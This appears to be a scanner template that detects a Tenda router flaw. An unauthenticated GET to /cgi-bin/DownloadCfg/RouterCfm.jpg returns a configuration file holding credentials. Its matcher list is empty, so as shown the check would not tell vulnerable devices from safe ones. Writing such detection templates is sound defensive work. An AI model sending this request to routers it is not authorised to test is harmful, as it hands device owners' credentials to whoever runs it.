id: tenda-credential-disclosure
brief:
    title: Tenda Router - Credential Disclosure
    by: pussycat0x
    level: high
    about: Tenda router allows unauthenticated users to download the configuration file containing sensitive credentials via the /cgi-bin/DownloadCfg/RouterCfm.jpg endpoint.
    label:
        - tenda
        - exposure
        - config
        - iot
        - router
        - discovery
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/cgi-bin/DownloadCfg/RouterCfm.jpg'
      signs: []
